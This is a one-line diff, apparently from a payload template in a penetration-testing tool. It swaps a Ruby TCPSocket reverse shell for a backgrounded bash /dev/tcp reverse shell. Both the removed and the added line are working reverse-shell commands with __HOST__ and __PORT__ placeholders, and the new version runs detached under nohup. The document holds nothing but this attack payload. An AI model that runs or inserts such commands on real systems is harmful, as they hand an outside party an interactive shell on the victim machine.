@@ -1,1 +1,1 @@
-ruby -rsocket -e'f=TCPSocket.open("__HOST__",__PORT__).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+/usr/bin/nohup /bin/bash -c "ruby -rsocket -e 'exec(\"/bin/bash\",\"-c\",\"/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1\");'" &
